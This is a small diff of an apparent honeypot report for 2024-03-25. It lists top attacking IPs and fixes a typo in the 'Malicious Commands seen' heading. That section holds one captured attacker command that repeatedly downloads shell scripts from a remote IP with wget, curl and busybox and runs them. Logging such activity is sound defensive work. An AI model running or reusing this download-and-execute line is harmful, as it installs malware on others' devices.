@@ -6,7 +6,7 @@ Top 5 IPs for 2024-03-25 :
 220.83.209.195
 221.163.214.3
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 cd /data/local/tmp/; busybox wget http://103.188.244.189/w.sh; sh w.sh; curl http://103.188.244.189/c.sh; sh c.sh; wget http://103.188.244.189/wget.sh; sh wget.sh; curl http://103.188.244.189/wget.sh; sh wget.sh; busybox wget http://103.188.244.189/wget.sh; sh wget.sh; busybox curl http://103.188.244.189/wget.sh; sh wget.sh
 
